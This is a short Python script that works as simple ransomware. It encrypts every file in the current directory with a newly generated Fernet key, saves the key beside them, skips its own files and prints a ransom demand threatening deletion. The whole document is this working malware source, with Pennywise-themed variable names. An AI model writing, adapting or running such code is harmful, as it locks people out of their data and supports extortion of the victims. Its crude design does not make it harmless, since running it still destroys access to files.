import os
from cryptography.fernet import Fernet

files=[]
for q in os.listdir():
    if q=="pennywise.py" or q=="thefear.key" or q=="decrypt.py":
        continue
    if os.path.isfile(q):
        files.append(q)
print(files)

fear=Fernet.generate_key()
with open("thefear.key","wb") as thefear:
    thefear.write(fear)
for balloon in files:
    with open(balloon,"rb") as theredone:
        contents=theredone.read()
    contents_crypted=Fernet(fear).encrypt(contents)
    with open(balloon,"wb") as theredone:
        theredone.write(contents_crypted)

print("All your files have been encrypted. Pay the ransom or they will be deleted forever.")